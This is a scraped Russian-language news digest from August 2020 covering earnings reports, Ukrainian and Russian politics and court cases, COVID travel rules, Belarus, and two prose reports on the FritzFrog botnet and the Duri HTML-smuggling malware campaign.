Согласно отчету компании, выручка в минувшем квартале возросла с $18,42 млрд за аналогичный период прошлого года до $22,98 млрд, что также оказалось лучше ожиданий аналитиков в $19,97 млрд. Сопоставимые продажи, тем временем, повысились на рекордные 24,3%, а сопоставимые онлайн-продажи взлетели на 195%.
 
Источники

В Калининграде ищут подрядчика, который избавится от трещин и провалов возле стадиона на Острове. Информация опубликована на сайте госзакупок.
Заказчиком выступает ГАУ КО "Стадион Калининград". Начальная цена контракта — 6,08 млн рублей. Техосмотр показал, что 22 колодца и девять срубленных свай выпирают выше уровня грунта, их подрежут до необходимых отметок. Водоприёмные локти провалены и повреждены — их демонтируют и заменят. Треснувшие бортовые камни, асфальт и плитку также приведут в порядок.
Подать заявку на участие в торгах можно до 9 сентября, победителя выберут 11 числа. Работы подрядчик должен выполнить за месяц со дня подписания договора.
Экс-министр Амир Кушхов который проходит обвиняемым по делу о хищениях при строительстве стадиона, объяснил изменения грунта на территории Острова. По его словам, "это природа, и человек не может на это влиять".
 
Источники

Люблинский районный суд оштрафовал на 10 тысяч рублей каждую трех журналисток, собравшихся 13 июля у СИЗО «Лефортово» в поддержку арестованного экс-журналиста «Коммерсанта» Ивана Сафронова. Об этом сообщает координатор юридической помощи ОВД-Инфо Анна Ромащенко.
Суд признал виновными в нарушении правил проведения публичных мероприятий (ч. 5 ст. 20.2 КоАП) журналистку «Коммерсантъ FM» Аллу Пугачев, журналистку «Коммерсанта» Лилию Галявиеву и журналистку издания «Холод» Марию Карпенко.
13 июля у здания СИЗО «Лефортово» прошла акция в поддержку Ивана Сафронова. В тот день Сафронову предъявили обвинение. Полиция задержала 15 журналистов, на них затем составили протоколы о «собрании-пикетировании».
Интересы задержанных в суде представляли адвокаты от ОВД-Инфо Сергей Тельнов и Елена Шереметьева.
Иван Сафронов — бывший журналист «Коммерсанта» и «Ведомостей», на момент ареста занимал должность советника руководителя «Роскосмоса». Преследование Сафронова связывают с его журналистской деятельностью, он занимался освещением работы военно-промышленного комплекса. Сафронова задержали 7 июля 2020 года сотрудники ФСБ в рамках дела о госизмене. В тот же день суд отправил его в СИЗО на два месяца.
В день ареста Сафронова, 7 июля, у здания ФСБ на Лубянке проходили одиночные пикеты в его поддержку, большинство участников — журналисты. Полиция задержала 28 человек.
 
Источники

Служба безопасности Украины задокументировала сделку по хищению государственных средств, которые были выделены на модернизацию спортивной базы учебно-воспитательного комплекса Краснопольской поселкового совета.
Об этом пишет RegioNews со ссылкой на сайт СБУ.
По предварительным данным следствия, по результатам проведенных торгов местный отдел образования заключил договор с руководителем коммерческой структуры на строительство школьного стадиона. Для реализации инфраструктурного проекта на счета победителя тендера было перечислено более 950 тысяч бюджетных денег.
Однако, по выводам комплексной экспертизы, предусмотренные договором работы подрядчик не проводил. Также установлено, что средства на строительство были выведены фигурантом в тень через использование счетов аффилированных фирм и внесение недостоверных сведений в отчетной документации.
В настоящее время руководителю подрядной структуры сообщено о подозрении по ч. 5 ст. 191 (присвоение, растрата имущества или завладение им путем злоупотребления служебным положением), ч. 2 ст. 209 (легализация (отмывание) доходов, полученных преступным путем) и ч. 2 ст. 366 (служебная подделка) Уголовного кодекса Украины. Обвинительный акт направлен в суд.
Продолжаются следственные действия для привлечения к ответственности других лиц, причастных к противоправной деятельности.
Напомним, сегодня СБУ блокировала работу центра, который занимался оптимизацией налогов.
 
Источники

На сегодняшнем заседании Кабмин согласовал проект постановления, которое позволит обеспечить повышение качества предоставления административных услуг в сокращенные сроки по государственной регистрации структурного образования партии как юридического лица.
Об этом на своей странице в Facebook сообщил представитель Кабинета министров в Верховной Раде Василий Мокан.
Речь идет об ускорении рассмотрения документов за проведение госрегистрации изменений в сведения о структурное образование политической партии как юридического лица, кроме внесения изменений в информацию об осуществлении зв'связи с юридическим лицом:
с 7-ми до 5-ти рабочих дней в двойном размере административного сбора;
 
с 5-ти до 2-х рабочих дней в пятикратном размере административного сбора за соответствующую регистрацию.
 
Напомним, сегодня во время заседания правительства Шмыгаль поручил подготовиться к безопасному проведению местных выборов.
 
Источники

Кабинет Министров Украины уволил Игоря Муратова с должности председателя Государственной таможенной службы Украины.
Об этом в Facebook сообщил народный депутат от "Слуги народа" Василий Мокан, передает RegioNews.
Муратов был назначен временным руководителем Государственной таможенной службы Украины 24 апреля 2020 года.
 
Также известно, что следующим решением Кабинет Министров распорядился временно возложить обязанности председателя Государственной таможенной службы на Андрея Павловского.
Павловский с 4 июня 2020 года работал заместителем председателя Гостаможслужбы, до этого он занимал должность директора департамента в Министерстве финансов.
Напомним, премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения разработать рекомендации для безопасного проведения очередных местных выборов 25 октября.
 
Источники

Специалисты компании Guardicore Labs опубликовали доклад об активности сравнительно нового P2P-ботнета FritzFrog, который на протяжении 2020 года успел заразить по меньшей мере 500 правительственных и корпоративных SSH-серверов.
Впервые ботнет был замечен в январе нынешнего года. За последние восемь месяцев FritzFrog неоднократно совершал брутфорс-атаки на SSH-серверы, принадлежащие госорганам, телекоммуникационным, финансовым компаниям и предприятиям в сфере здравоохранения и образования по всему миру. Как минимум 500 атак оказались успешными.
FritzFrog представляет собой децентрализованный ботнет, использующий P2P-протоколы для управления своими узлами.
После взлома SSH-сервера, на систему загружается бесфайловое вредоносное ПО, которое исполняется только в памяти, превращая устройство в бот, способный получать и выполнять команды. Вредонос FritzFrog распаковывается на системе под именами ifconfig и nginx и запускается как ожидающий команды стартовый процесс, прослушивающий порт 1234. Эти команды достаточно просто обнаружить, поэтому злоумышленники подключаются к жертве через SSH и запускают клиент Netcat.
Все команды передаются в зашифрованном виде. Первая подключает устройство к уже существующей бот-сети, а остальные используются для установки бэкдора, мониторинга сети, ресурсов ПК и процессора.
Основная цель FritzFrog - майнинг криптовалюты. Для этого ботнет использует ПО для майнинга Monero под названием XMRig. Если процессы на сервере задействуют слишком много ресурсов процессора, FritzFrog завершает их для предоставления мощности майнеру.
По словам специалистов, FritzFrog использует проприетарный P2P-протокол, что может говорить о высоком профессионализме его разработчиков. Guardicore Labs не удалось найти конкретных свидетельств причастности к ботнету какой-либо группировки, но они выявили некоторое сходство между FritzFrog и ботнетом Rakos, обнаруженным в 2016 году.
 
Источники

21 августа на Санкт-Петербургской бирже стартуют торги акциями европейских компаний. На организованных торгах станут доступны акции первых пяти эмитентов из Германии с суммарной рыночной капитализацией &euro;123,98 млрд. На первоначальном этапе, в течение ближайших двух месяцев, планируется добавить на торги еще 47 немецких компаний, говорится в сообщении биржи.
Организованные торги и расчеты по сделкам будут осуществляться в евро на второй день (Т+2). Торговая сессия будет проводиться с 10:00 мск до 18:35 мск в соответствии с европейским торговым календарем. Тикеры ценных бумаг будут иметь постфикс @DE, как на немецких торговых площадках. Минимальный лот - одна акция.
'''Основные сведения об эмитентах:'''
'''Bayerische Motoren Werke Aktiengesellschaft''' (SPB: BMW@DE ) - BMW Group, один из ведущих мировых производителей легковых автомобилей премиум-класса, концерн управляет также брендами Mini и Rolls-Royce.
'''Infineon Technologies AG''' (SPB: IFX@DE ) - компания была выделена из немецкого промышленного конгломерата Siemens в 2000 году, является одним из крупнейших производителей микросхем в Европе.
'''MERCK Kommanditgesellschaft auf Aktien''' (SPB: MRK@DE ) - материнская компания группы компаний MERCK, фармацевтического гиганта, который насчитывает более 250 дочерних подразделений.
'''Henkel AG & Co. KGaA''' (SPB: HEN3@DE ) - производитель потребительских товаров двух бизнес-сегментов: косметическая продукция (Schwarzkopf, Syoss) и бытовая химия (Persil, Bref).
''' Carl Zeiss Meditec AG''' (SPB: AFX@DE ) - немецкий производитель офтальмологических устройств, таких как интраокулярные линзы, диагностическое оборудование и рефракционные лазерные системы, а также оптического оборудования для микрохирургии.
ТикерНаименование эмитентаСекторОтрасльКапитализация, млрд евроP/EДиапазон цен за последние 52 недели, евроBMW@DEBayerische Motoren Werke AktiengesellschaftНеосновные потребительские товарыПроизводители автомобилей37,511,7636,60 - 77,06IFX@DEInfineon Technologies AGИнформационные технологииПроизводство полупроводников28,7470,0910,22 - 23,51MRK@DEMERCK Kommanditgesellschaft auf AktienЗдравоохранениеПроизводство фармацевтической продукции14,7535,3176,34 - 125,55HEN3@DEHenkel AG & Co. KGaAПотребительские товары массового спросаПроизводство предметов личной гигиены34,8821,1361,60 - 97,80AFX@DECarl Zeiss Meditec AGЗдравоохранениеИнформационные услуги для здравоохранения8,1167,9867,90 - 121,90
 
Источники

Акционеры "Полюса" на годовом общем собрании во вторник утвердили выплату финальных дивидендов за 2019 год в размере 244,75 рубля на акцию.
"С учетом ранее выплаченных промежуточных дивидендов по обыкновенным акциям ПАО "Полюс" по результатам 6 месяцев 2019 года в размере 162,98 руб. на одну обыкновенную акцию ПАО "Полюс", окончательную выплату дивидендов произвести в размере 244,75 руб. на одну обыкновенную акцию ПАО "Полюс", - говорится в сообщении компании.
Датой закрытия реестра акционеров, имеющих право на получение выплат, решено установить 28 августа 2020 года.
 
Источники

Американский производитель микросхем Analog Devices представил финансовую отчетность за третий фискальный квартал, завершившийся 1 августа, в соответствии с которой выручка уменьшилась на 2% г/г и оказалась на уровне $1,46 млрд, превысив, тем не менее, усредненный прогноз аналитиков в $1,44 млрд.
Согласно отчету компании, чистая прибыль незначительно увеличилась и достигла $362,7 млн или 97 центов на акцию против $362,4 млн или 97 центов на бумагу годом ранее. При этом скорректированная прибыль в расчете на одну акцию возросла с $1,26 годом ранее до $1,36, что оказалось выше ожиданий аналитиков в $1,3.
По оценкам Analog Devices, скорректированная прибыль в четвертом фискальном квартале ожидается в диапазоне $1,22-1,42 на одну акцию при выручке в $0,74-2,14 млрд.
 
Источники

Правительство внесло изменения в Положение о возложении специальных обязанностей на субъектов рынка природного газа. Из постановления исключили пункт об обязательствах облгазов (газсбытов поставлять газ всем бытовым потребителям и религиозным организациям на своей лицензионной территории.
Соответствующее решение принято на заседании правительства 19 августа, сообщает RegioNews со ссылкой на " РБК-Украина".
Как отмечается в пояснительной записке к проекту, постановление Кабмина о ПСО утратило действие в части поставки природного газа населению.
 
Согласно постановлению, поставщики могут отказать бытовому потребителю, религиозной организации, газопотребления которых располагаются в пределах соответствующей территории лицензированной деятельности по распределению природного газа в заключении договора поставки природного газа.
Напомним, в конце июля стало известно, что запасы газа в украинских хранилищах побили прошлогодний рекорд.
 
Источники

Президента Украины Владимира Зеленского в четверг, 20 августа, ждут в Херсонской области с рабочей поездкой.
Об этом пишет RegioNews со ссылкой на Херсонскую ОГА.
 
 
Напомним, в июне Владимир Зеленский уже посещал Херсонскую область. Тогда на встречу с президентом не пустили многих местных журналистов, из-за чего возник скандал и местные СМИ вышли с пустыми полосами, на которых планировали осветить визит главы государства.
 
Источники

Евросоюз не признал результаты президентских выборов в Белоруссии. Об этом, ссылаясь на главу Евросовета, пишет "Би-би-си" в среду, 19 августа.
 
Источники

В центре города Яремче Ивано-Франковской области на координатора общественной инициативы “Яремчанский Набережная” Веру Галайко напала группа лиц.
Видео нападения опубликовал на Facebook-странице пользователь Роман Биланюк, сообщает RegioNews.
 
На видео видно, как один из парней в черном подходит и убеждается, что это именно Вера Галайко, которую им заказали. Впоследствии другой преступник, тоже в черном, выливает на женщину ведро нечистот. Третье лицо в это время проводит видеосъемку вдоль стенда рекламы.
 
 
Напомним, во Львове известная волонтер облила себя бензином.
 
Источники

Американский ритейлер TJX Companies опубликовал финансовые результаты за второй квартал, в соответствии с которыми чистая убыток составил $214,2 млн или 18 центов на акцию по сравнению с прибылью в $759 млн или 62 цента на бумагу годом ранее, тогда как аналитики в среднем ожидали убыток на уровне 10 центов в расчете на одну акцию.
Согласно отчету компании, продажи в минувшем квартале сократились с $9,78 млрд за аналогичный период прошлого года до $6,67 млрд, превысив, тем не менее, усредненный прогноз аналитиков в $6,55 млрд.
Отметим, что сопоставимые продажи ритейлера в магазинах HomeGoods выросли на 20% г/г, а в магазинах Marmaxx - сократились на 6% г/г.
 
Источники

В Калининграде бывший председатель СНТ "Чайка" предстанет перед судом за хищение денег членов товарищества. Об этом сообщает пресс-служба областной прокуратуры.
С 2016 по 2018 годы злоумышленник присвоил 351 тысячу рублей. В мае 2019-го было возбуждено уголовное дело по ч. 3 ст. 160 УК РФ ("Присвоение или растрата, совершённые лицом с использованием своего служебного положения"). Документы направлены в суд для рассмотрения по существу.
Кроме того, в ходе процессуальной проверки были выявлены признаки ещё одного состава преступления, предусмотренного ч. 4 ст. 160 УК РФ. По версии следствия, неустановленное лицо похитило денежные средства в сумме 1,7 млн. рублей, внесённых членами товарищества в качестве платы за электроэнергию, чем причинило СНТ "Чайка" особо крупный материальный ущерб», — добавили в прокуратуре.
Возбуждено ещё одно дело по ч. 3 ст. 160 УК РФ. Ход расследования находится на контроле в прокуратуре.
 
Источники

Кабинет министров во время заседания 19 августа принял ряд кадровых назначений и увольнений.
Об этом в Facebook сообщил представитель правительства в парламенте Василий Мокан, передает RegioNews.
В частности, государственным секретарем Министерства по вопросам стратегических отраслей промышленности Украины был назначен Игорь Яковлев.
Также первым заместителем Председателя Государственного агентства Украины по вопросам кино стала Юлия Шевчук. Ткача Сергея Александровича Правительство назначило заместителем Председателя Государственной инспекции энергетического надзора Украины.
Егор Бодров и Павел Шевченко стали заместителями Председателя Государственной службы Украины по вопросам геодезии, картографии и кадастра.
Кроме того, Кабмин одобрил кандидатуру Анатолия Мазуренко на должность генерального директора Государственного авиационного предприятия "Украина".
На Сергея Ковшара временно были возложены обязанности директора государственного предприятия "Морской торговый порт "Южный".
Во время заседания Кабинет Министров также уволил Наталью Рябцеву с должности заместителя Председателя Национальной службы здоровья Украины по собственному желанию.
Екатерина Ставнийчук была уволена с должности первого заместителя Председателя Государственной службы Украины по безопасности на транспорте (по соглашению сторон, 31 августа 2020 года).
Напомним, премьер-министр Украины Денис Шмигаль поручил Министерству здравоохранения разработать рекомендации для безопасного проведения очередных местных выборов 25 октября.
Также во время заседания 19 августа Кабмин уволил председателя Государственной таможенной службы Украины.
 
Источники

Минкомсвязи РФ подготовило проект о внесении изменений в закон «О связи» для определения порядка формирования, ведения и использования перечня социально значимых сайтов, доступ к которым будет бесплатным в рамках программы «Доступный интернет». Требования к таким сайтам будут утверждаться правительством, пишут «Ведомости» со ссылкой на письмо направленное замминистра связи Олегом Ивановым президенту Российского союза промышленников и предпринимателей (РСПП) Александру Шохину.
В частности, для включения в перечень социально значимых ресурс должен соответствовать следующим критериям:
иметь доменную зону.ru,.рф,.su,.дети;
быть создан и находиться на территории РФ;
владельцем сайта должно являться российское юридическое лицо;
доля иностранного капитала — не более 20%;
не менее 50% аудитории должно иметь доступ к ресурсу с территории РФ;
не должен содержать видео-, аудиоконтента и рекламы (кроме социальной);
должен состоять преимущественно из российского контента;
основным языком должен быть русский язык или государственные языки регионов;
запрещается публикация платных услуг или ссылок на них (кроме государственных или муниципальных);
должен входить в Реестр ОРИ;
должен быть доступным по одному статическому сетевому адресу.
Эксперимент проекта «Доступный интернет», в рамках которого предоставляется бесплатный доступ к списку социально значимых сайтов, проходит по поручению президента Владимира Путина от 15 января текущего года. Он стартовал 1 апреля и до сих пор проводился только в сетях домашнего интернета «Ростелекома», «ЭР-Телекома», МТС, NetByNet («дочка» «МегаФона») и «Вымпелкома».
В конце июня министр связи Максут Шадаев объявил о продлении эксперимента до 31 декабря и анонсировал расширение на мобильную связь. К участию в проекте приглашены все операторы связи в России. Как уточнили в Минкомсвязи, согласно данным самих операторов, бесплатным доступом за время эксперимента воспользовалось более 1 млн уникальных пользователей. На данный момент список социально значимых ресурсов включает 371 сайт.
 
Источники

Исследователи безопасности компании Menlo Security рассказали о новой вредоносной кампании, в ходе которой злоумышленники используют техники HTML smuggling и BLOB-объекты для загрузки вредоносного ПО в обход решений безопасности.
В ходе кампании, получившей название Duri, используется метод BLOB-объектов JavaScript, генерирующий вредоносные файлы в браузере, что позволяет избегать обнаружения песочницами и прокси.
"Работа традиционных сетевых решений безопасности наподобие межсетевых экранов, прокси-серверов и песочниц основывается на передаче объектов по проводам. К примеру, песочница может извлекать передаваемые по проводам файловые объекты, такие как.exe,.zip и другие подозрительные объекты, и отправлять на обезвреживание", - пишут исследователи.
Однако в ходе Duri киберпреступники используют технику под названием HTML smuggling, представляющую собой комбинацию JavaScript, HTML5 и data: URL. Техника позволяет генерировать полезную нагрузку "на лету" и загружать файлы непосредственно из браузера. Другими словами, вся полезная нагрузка собирается на стороне клиента (браузера), поэтому никакие объекты не отправляются в песочницу для проверки.
Когда пользователь нажимает на предоставленную злоумышленником ссылку, через многочисленные переадресации он оказывается на HTML-странице на duckdns.org. Эта страница запускает JavaScript-код для генерирования BLOB-объекта из закодированной с помощью base64 переменной, содержащейся внутри скрипта.
ZIP-файл генерируется из одного только JavaScript-кода. В конце выполнения скрипт запускает загрузку архива в браузере. В ZIP-архиве содержится полезная нагрузка - MSI-файл.
 
Источники

Госсекретарь Майк Помпео проводит в среду переговоры с министром иностранных дел Ирака Фуадом Хуссейном.
По итогам переговоров Помпео и Хуссейн проводят совместную пресс-конференцию.
Позднее в среду Майк Помпео встречается с премьер-министром Ирака Мустафой аль-Казыми.
Напомним, что в минувшую пятницу в Совете Безопасности ООН состоялось голосование по вопросу о продлении оружейного эмбарго в отношении Ирана. Проект резолюции, предложенный США, не набрал необходимого числа голосов.
За проект высказались США и Доминиканская Республика, против – Россия и Китай. 11 государств-членов СБ ООН воздержались.
В заявлении, опубликованном на сайте госдепартамента, госсекретарь Помпео подчеркнул, что «неспособность Совета Безопасности решительно действовать в защиту международного мира и безопасности непростительна».
«Совет Безопасности ООН несет ответственность за поддержание международного мира и безопасности. Сегодня он не смог выполнить свою основную миссию. Он отклонил разумную резолюцию по продлению оружейного эмбарго в отношении Ирана, существовавшего на протяжении 13 лет, и создал условия для того, чтобы главный спонсор терроризма в мире покупал и продавал обычные вооружения без специальных ограничений со стороны ООН», – говорится далее в документе.
В нем также подчеркивается, что США «никогда не оставят своих друзей в регионе» и «будут работать и дальше, чтобы теократический режим не имел свободы покупать и продавать вооружения, которые угрожают сердцу Европы, Ближнему Востоку и миру в целом».
 
Источники

Число родственников, которые могут сопровождать школьников на линейку 1 сентября, ограничат из-за пандемии. Об этом рассказала глава комитета по образованию горадминистрации Татьяна Петухова во время рабочего выезда в среду, 19 августа.
Мы очень настоятельно просим, чтобы не вся семья, начиная с бабушки и дедушки и заканчивая дядями и тётями, присутствовала на линейке. Просим несколько ограничить количество сопровождающих. Не больше двух человек. Например, мама и папа".
Петухова добавила, что в День знаний не будет традиционной экскурсии по школе для родных первоклашек. Всё это связано с особым режимом, в котором будут работать учебные заведения с первого сентября.
 
Источники

Алексея Шварца, координатора штаба Навального в Кургане, вызвали в Следственный комитет по делу об уклонении от прохождения военной службы (ст. 328 УК). Об этом Шварц сообщил «МБХ медиа».
По словам Шварца, полицейские остановили его на улице возле дома и сказали, что он должен явиться в СК для опроса. Шварц ответил, что его уже опрашивали: две недели назад он общался со следователем во «ВКонтакте».
Ранее координатору курганского штаба Навально угрожали возбуждением уголовного дела по статье об уклонении от службы в армии и пытались вручить просроченную повестку в военкомат.
Двух сотрудников Фонда борьбы с коррупцией Алексея Навального призвали в армию с нарушением законов. 23 декабря задержали Руслана Шаведдинова и отправили проходить военную службу на Новой земле. 22 июня задержали Артема Ионова и отправили в часть в Благовещенске.
Сотрудники и волонтеры штабов оппозиционера Алексея Навального регулярно сталкиваются с различными формами политически мотивированного давления со стороны государства. Так, в рамках уголовного дела об отмывании денег в ФБК обыски проводили у сотрудников штабов Навального по всей стране.
 
Источники

Мэр Львова Андрей Садовой будет баллотироваться на мэра Львова на местных выборах в 2020 году.
Об этом он сообщил в своем видеообращении на своей странице в Facebook, пишет RegioNews.
Андрей Садовойрассказал, что будет баллотироваться для того, чтобы завершить проекты, которые не успел в предыдущие каденции - мусороперерабатывающий завод, ремонт улиц Степана Бандеры, Шевченко, Суботовской, ремонт больницы скорой помощи, строительство моста и другие инфрастуктурные проекты.
 
 
Напомним, Садовой и Синютка лидируют в рейтингах кандидатов в мэры Львова – СОЦИС
 
Источники

Крупнейшая в Китае компания в сфере морской добычи нефти China National Offshore Oil Corp (CNOOC) зафиксировала снижение прибыли в первом полугодии, которая оказалась на минимальном уровне с декабря 2017 года, поскольку из-за пандемии коронавируса сократился мировой спрос на энергоносители, тогда как цены на нефть достигли исторических минимумов.
Так, чистая прибыль компании за первые шесть месяцев года составила 10,38 млрд юаней ($1,5 млрд), тогда как аналитики в среднем прогнозировали 12,6 млрд юаней. Выручка, тем временем, сократилась на 32% г/г.
Стоит отметить, что объемы производства компании возросли в отчетном периоде на 6,1% г/г и составили 257,9 млн баррелей нефтяного эквивалента.&nbsp;
 
Источники

Головинский районный суд продлил на три месяца меру пресечения Азату Мифтахову, обвиняемому по делу о хулиганстве. Об этом ОВД-Инфо сообщила адвокат Свтелана Сидоркина.
В ходе заседания Сидоркина заявила ходатайства о допуске слушателей в зал и о предоставлении возможности Мифтахову сидеть рядом с адвокатом. Оба ходатайства судья отклонил.
Азат Мифтахов — анархист, которого арестовали по делу о хулиганстве, совершенному группой лиц (ч. 2 ст. 213 УК). По версии следствия, 30 января 2018 года Мифтахов, Андрей Ейкин, Елена Горбань и Алексей Кобаидзе разбили окно в офисе «Единой России» и кинули туда дымовую шашку.
Математика задержали 1 февраля 2019 года, позднее он рассказал​ адвокату о пытках шуруповертом. Следующие 11 дней ему продлевали задержание под разными предлогами. ОВД-Инфо подробно рассказывал об аспектах задержания Мифтахова, и публиковал хронологию развития дела о разбитом окне в офисе «Единой России». Мифтахов уже больше года находится в СИЗО.
 
Источники

Новые вспышки коронавируса вновь поставили под угрозу туризм в Европе. Эксперты рассматривают новые схемы въезда, например, двойное тестирование всех путешественников на Covid-19, сообщает АТОР.
В штаб-квартире ЕС говорят о том, что закрытие границ и ограничения на поездки мешают восстановлению передвижения в Европе, пишет РИА Новости.
Правительствам стран рекомендовано применять меры, основанные на научных данных. Например, не только смотреть на количество новых случаев за последние две недели, но и принимать во внимание стратегии и объемы тестирования.
Кроме того, обсуждается схема двойного тестирования на коронавирус, которая с 19 августа заработает в Исландии. Все прибывающие в Исландию будут обязаны пройти пятидневный карантин и два теста на коронавирус. Первый - проводится сразу по прилету, второй – на четвертый-пятый день карантина. Если оба дадут отрицательный результат, путешественникам разрешат прервать изоляцию.
Число случаев коронавируса в мире превысило 22.1 млн. Более 781 тысячи человек умерли, выздоровели 14 млн.
 
Источники

Индонезийский остров Бали может начать принимать иностранных туристов с 11 сентября, однако окончательное решение должна принять столица Индонезии Джакарта.
На острове уже несколько недель говорят о возобновлении международных рейсов в сентябре, особенно с учетом того, что с 31 июля возобновился внутренний туризм, пишет CNN.
Однако пока неизвестно, будет ли страна вводить ограничения для граждан из государств с неблагоприятной эпидемиологической ситуацией.
Сейчас на острове открыты пляжи, храмы и популярные туристические достопримечательности.
По состоянию на 19 августа в Индонезии выявлено 144,945 случаев коронавируса, 6346 человек умерли, 98,657 человек выздоровели.
 
Источники

В Украине к ослаблению карантина остаются не готовыми столица и еще 13 областей
Как сообщает RegioNews, об этом свидетельствуют данные, обнародованные пресс-службой Министерством здравоохранения.
Кроме Киева, к ослаблению карантина не готовы такие области: 
Волынская;
 
Винницкая;
 
Житомирская;
 
Закарпатская;
 
Ивано-Франковская;
 
Киевская;
 
Львовская;
 
Одесская;
 
Ровенская;
 
Сумская;
 
Тернопольская;
 
Харьковская;
 
Черновицкая.
Во всех этих регионах, кроме Винницкой области, превышен показатель новых случаев заболевания за 14 дней.
При этом в десяти регионах – Киев, Винницкая, Волынская, Закарпатская, Ивано-Франковская, Львовская, Одесская, Ровенская, Тернопольская и Черновицкая области – за последние 5 дней превышен показатель загруженности больничных коек первой волны.
Ранее стало известно, что завтра Кабмин дополнительно пересмотрит зоны карантина в Украине.
 
Источники

Министерство реинтеграции планирует осенью завершить разработку концепции экономического развития Донбасса. Основное внимание будет уделено подконтрольным правительству Украины частям Донецкой и Луганской областей.
Как сообщает RegioNews со ссылкой на пресс-службу министерства, об этом заявил вице-премьер-министр – министр по вопросам реинтеграции Алексей Резников.
По его словам, целью концепции является создание инвестиционного климата и внедрение новой экономической модели на Донбассе.
 
Вице-премьер добавил, что сейчас правительство рассматривает возможность распространения правил международного коммерческого арбитража на регион.
 
Ранее сообщалось, что украинская делегация в ТКГ по Донбассу будет предлагать варианты переговоров с представителями ОРДЛО.
 
Источники

Шоумен и кандидат в мэры Киева Сергей Притула заявил о планах отказаться от шоу-бизнеса в пользу политики.
Об этом он рассказал в интервью изданию LB.ua, передает RegioNews.
Он также сообщил, что выходит из юмористического проекта «Вар&#39;яти-шоу», который создал десять лет назад.
 
Он добавил, что планирует сняться в последнем сезоне «Варьяты-шоу».
 
Напомним, притула и Верещук не проходят в тройку лидеров на выборах в мэры Киева. У них почти одинаковый рейтинг. Также кандидат в мэри Киева Притула рассказал, кого никогда не возьмет в свою команду.
 
Источники

Сегодня, 19 августа, городской председатель Львова Андрей Садовой отмечает свой день рождения. По этому случаю львовяне создали видео, в котором вспомнили все скандалы и ляпы мэра.
Соответствующее видео поширили в соцсетях, пишет Regionews.
 
Напомним, час назад мэр Львова Андрей Садовой заявил, что будет участвовать в местных выборах осенью.
 
Источники

Стендапер Иван Усович признался в подкасте о том, что его брата забрали в ИВС на Окрестина, когда он ехали мимо на велосипеде. Об этом комик сообщил на «KuJi Podcast».
Он сказал, что 10 августа его брат ехал на велосипеде и решил узнать, что происходит в центре Минска. После того как услышал взрывы светошумовых гранат захотел вернуться домой другим путём. Он поинтересовался у ОМОНа какая обходная дорога безопасна, в ответ они его задержали.
По рассказу стендапера, его брата избивали и ставили на колени, но тот «сжал зубы и терпел» и отделался нормально, сейчас уже вышел. Усович, передавая слова брата, объяснил многочисленные травмы заключённых в ИВС тем, что они разговаривали с сотрудниками и издавали звуки при избиениях.
Юморист предположил, что недопуск медиков в ИВС и не выход всех заключённых тем, что в спецприёмнике остались трупы или сильно покалеченные.
 
 
Ссылки
* Запись подкаста (о брате на 16-й минуте).

В Западный военный округ для охраны границ направят истребители-"невидимки" Су-57. Меры приняты в ответ на усиление воздушной группировки НАТО. Об этом, ссылаясь на источники в Минобороны России, пишут "Известия" в среду, 19 августа.
Это радикально нарастит возможности авиации ЗВО и сделает возможным быстрое уничтожение самолётов противника в регионе. В НАТО это прекрасно понимают. Создание мощной авиационной группировки блока возле северо-западных рубежей России было военно-политической авантюрой. Создание ответной группировки авиации, которая имеет на порядок большие ударные возможности — вполне логичный шаг нашего руководства. В сочетании с мощными сухопутными силами, особенно в Калининградской области, российская авиационная группировка превратит военный потенциал НАТО в регионе в ничто», — отметил вице-президент Академии геополитических проблем полковник Владимир Анохин.
Отечественные ВКС получат "невидимку" в начале следующего года. Первыми будут шестая армия ВВС и ПВО Западного военного округа. Сейчас производители исполняют контракты на поставку 76 Су-57 для Министерства обороны РФ. Государственные испытания предсерийной партии "невидимок" планируется завершить в этом году.
 
Источники

С начала текущих суток на участках ответственности украинских подразделений в районе проведения операции Объединенных сил, зафиксирован 1 факт нарушения режима прекращения огня со стороны вооруженных формирований Российской Федерации.
Об этом пишет RegioNews со ссылкой на штаб ООС.
В частности, в обеденное время противник из стрелкового оружия провоцировал наших защитников у Луганского. Выстрелы были не прицельными, поэтому украинские военные огонь в ответ не открывали и на провокации врага не поддались.
На всех других участках фронта режим тишины сохранялся в полной мере.
Среди личного состава Объединенных сил боевых потерь и ранений нет.
В районе проведения операции также выполняют задачи подразделения ГСЧС Объединенных сил. В частности, саперы разминировали около 6 га территории в прифронтовом районе и передали на уничтожение 39 найденных взрывоопасных предметов.
Кроме этого, для минимизации последствий артиллерийских обстрелов предыдущих лет спасатели Объединенных сил проводят работы по восстановлению поврежденных жилых домов и объектов инфраструктуры. Только за минувшие сутки они отремонтировали 37 квартир. Еще на 27 объектах работы продолжаются.
 
Напомним, за прошедшие сутки по всей линии разграничения не было зафиксировано провокаций и обстрелов со стороны вооруженных формирований боевиков.
 
Источники

Число родственников, которые могут сопровождать школьников на линейку 1 сентября, ограничат из-за пандемии. Об этом рассказала глава комитета по образованию горадминистрации Татьяна Петухова во время рабочего выезда в среду, 19 августа.
Мы очень настоятельно просим, чтобы не вся семья, начиная с бабушки и дедушки и заканчивая дядями и тётями, присутствовала на линейке. Просим несколько ограничить количество сопровождающих. Не больше двух человек. Например, мама и папа".
Петухова добавила, что в День знаний не будет традиционной экскурсии по школе для родных первоклашек. Всё это связано с особым режимом, в котором будут работать учебные заведения с первого сентября.
 
Источники

Евросоюз не признал результаты президентских выборов в Белоруссии. Об этом, ссылаясь на главу Евросовета Шарля Мишеля, пишет "Би-би-си" в среду, 19 августа.
ЕС намерен ввести санкции ответственных за фальсификацию выборов, насилие и репрессии в стране. Рассматривается вопрос включения в этот список и Александра Лукашенко. Евросоюз также выделит 53 млн евро на поддержку белорусского народа. Как и на что пойдут деньги, пока не уточняется.
Горбачёв рассказал об ошибке Лукашенко, которая может стоить тому поста президента.
 
Источники

Более 40 тысяч туристов из Германии обязаны в ближайшую неделю покинуть Балеарские острова и другие территории Испании из-за ситуации с коронавирусом.
Причина – исключение Испании из списка безопасных для посещения стран в связи с ростом случаев коронавируса в стране. Правительство Германии пересмотрело свои рекомендации и не рекомендовало туристам посещать территорию Испании за исключением Канарских островов, пишет Tourprom.
При этом все прибывающие из Испании должны будут сдать тест на коронавирус и пребывать на карантине до получения результатов или предъявить отрицательные результаты анализов, сделанных в течение 48 часов.
Туроператоры Германии в связи с данным решением сняли полетные программы в Испанию. Пребывающие там туристы могут вернутся назад досрочно.
Ранее из списка безопасных стран Испанию вычеркнула Великобритания. Поэтому Балеарским островам и курортам Испании фактически придется сворачивать сезон досрочно. О закрытии объявили около 400 отелей.
